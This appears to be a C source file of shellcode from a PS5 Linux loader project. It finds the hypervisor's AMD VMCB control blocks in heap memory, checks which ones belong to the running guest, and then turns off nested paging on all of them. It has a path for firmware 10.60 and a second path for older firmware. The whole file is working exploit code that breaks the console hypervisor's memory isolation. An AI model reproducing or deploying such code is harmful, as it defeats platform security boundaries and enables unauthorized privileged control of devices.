#include <stdint.h>

// The 10.60 AP path follows the VMCB identity checks in ps5-linux-loader's
// GPL-3.0 shellcode_break_hv/break_hv.c; the older firmware path is unchanged.
#define AP_MODE_1060       0x313631312D504142ULL
#define VMCB_IOPM_BASE_PA  0x40
#define VMCB_ASID          0x58
#define VMCB_NESTED_CR3    0xB0
#define VMCB_GUEST_CR3     0x550
#define VMCB_GUEST_RIP     0x578
#define MARK_ENTERED       0x454E544552454431ULL
#define MARK_DONE          0x444F4E452D415031ULL
#define MODE_STRIKE        0x31454B4952545356ULL

#define VMCB_NESTED_CTRL    0x90
#define VMCB_CLEAN          0xC0

#define read64(p)           (*(volatile uint64_t *) (uint64_t) (p))
#define read32(p)           (*(volatile uint32_t *) (uint64_t) (p))

#define write64(p, v)       (*(volatile uint64_t *) (uint64_t) (p) = (uint64_t) (v))
#define write32(p, v)       (*(volatile uint32_t *) (uint64_t) (p) = (uint32_t) (v))

static void vmcb_disable_np_1060(uint64_t *param)
{
  const uint64_t dmap = param[1];
  const uint64_t heap_lo = 0x62A00000ULL;
  const uint64_t heap_hi = 0x63800000ULL;
  volatile uint64_t *result = (volatile uint64_t *)(uintptr_t)param[2];
  volatile uint64_t *details = (volatile uint64_t *)(uintptr_t)param[4];
  uint64_t self = 0, self_count = 0, asid = 0;
  uint64_t targets = 0, selected = 0, written = 0, verified = 0;
  uint64_t error = 0;

  result[0] = MARK_ENTERED;
  result[1] = MODE_STRIKE;
  if (param[3] != 0 || !param[5] || !param[6])
    error = 1;

  if (!error) {
    for (uint64_t pa = heap_lo; pa < heap_hi; pa += 0x1000) {
      uint64_t vmcb = dmap + pa;
      if (read64(vmcb + VMCB_GUEST_CR3) == param[6] &&
          read64(vmcb + VMCB_GUEST_RIP) == param[5]) {
        if (self_count++ == 0)
          self = pa;
      }
    }
    if (self_count != 1)
      error = 2;
  }

  if (!error) {
    uint64_t vmcb = dmap + self;
    asid = read32(vmcb + VMCB_ASID);
    uint64_t ncr3 = read64(vmcb + VMCB_NESTED_CR3);
    uint64_t iopm = read64(vmcb + VMCB_IOPM_BASE_PA);
    if (read64(vmcb + VMCB_NESTED_CTRL) != 9 || asid == 0 || asid >= 16 ||
        (ncr3 & 0xfff) || ncr3 < heap_lo || ncr3 >= heap_hi ||
        (iopm & 0xfff) || iopm < heap_lo || iopm >= heap_hi)
      error = 3;
  }

  if (!error) {
    for (uint64_t pa = heap_lo; pa < heap_hi; pa += 0x1000) {
      uint64_t vmcb = dmap + pa;
      uint64_t ncr3 = read64(vmcb + VMCB_NESTED_CR3);
      uint64_t iopm = read64(vmcb + VMCB_IOPM_BASE_PA);
      if (read64(vmcb + VMCB_NESTED_CTRL) == 9 &&
          read32(vmcb + VMCB_ASID) == asid &&
          !(ncr3 & 0xfff) && ncr3 >= heap_lo && ncr3 < heap_hi &&
          !(iopm & 0xfff) && iopm >= heap_lo && iopm < heap_hi) {
        targets++;
        selected += pa == self;
      }
    }
    if (targets != 16 || selected != 1)
      error = 4;
  }

  // Nothing is written to the hypervisor until both identity and cardinality
  // checks above have succeeded.
  if (!error) {
    for (uint64_t pa = heap_lo; pa < heap_hi; pa += 0x1000) {
      uint64_t vmcb = dmap + pa;
      uint64_t ncr3 = read64(vmcb + VMCB_NESTED_CR3);
      uint64_t iopm = read64(vmcb + VMCB_IOPM_BASE_PA);
      if (read64(vmcb + VMCB_NESTED_CTRL) == 9 &&
          read32(vmcb + VMCB_ASID) == asid &&
          !(ncr3 & 0xfff) && ncr3 >= heap_lo && ncr3 < heap_hi &&
          !(iopm & 0xfff) && iopm >= heap_lo && iopm < heap_hi) {
        write64(vmcb + VMCB_NESTED_CTRL, 8);
        write32(vmcb + VMCB_CLEAN, 0);
        written++;
      }
    }
    for (uint64_t pa = heap_lo; pa < heap_hi; pa += 0x1000) {
      uint64_t vmcb = dmap + pa;
      uint64_t ncr3 = read64(vmcb + VMCB_NESTED_CR3);
      uint64_t iopm = read64(vmcb + VMCB_IOPM_BASE_PA);
      if (read64(vmcb + VMCB_NESTED_CTRL) == 8 &&
          read32(vmcb + VMCB_ASID) == asid &&
          !(ncr3 & 0xfff) && ncr3 >= heap_lo && ncr3 < heap_hi &&
          !(iopm & 0xfff) && iopm >= heap_lo && iopm < heap_hi &&
          read32(vmcb + VMCB_CLEAN) == 0)
        verified++;
    }
    if (written != 16 || verified != 16)
      error = 5;
  }
  details[0] = error;
  details[1] = self;
  details[2] = self_count;
  details[3] = targets;
  details[4] = asid;
  details[5] = written;
  details[6] = verified;
  result[5] = error;
  result[6] = written;
  result[7] = verified;
  result[3] = MARK_DONE;
}

void vmcb_disable_np(uint64_t *param)
{
  if (param[7] == AP_MODE_1060) {
    vmcb_disable_np_1060(param);
    return;
  }

  uint64_t dmap        = param[1];
  uint64_t hv_heap_off = param[4];
  uint64_t pcpus       = param[5];

  write64(param[2], 0xcafedead00001337ULL);

  uint64_t heap = read64(dmap + hv_heap_off);

  for (int core = 0; core < 16; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t) core * sizeof(uint64_t));
    if (!pcpu) {
      continue;
    }
    uint64_t vmcb = read64(dmap + (pcpu - heap) + 0xa8);
    if (!vmcb) {
      continue;
    }

    uint64_t vpa = vmcb - heap;
    uint64_t old = read64(dmap + vpa + VMCB_NESTED_CTRL);

    write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1);               // disable nested paging
    write32(dmap + vpa + VMCB_CLEAN, 0);                            // force reload on next VMRUN
  }
}
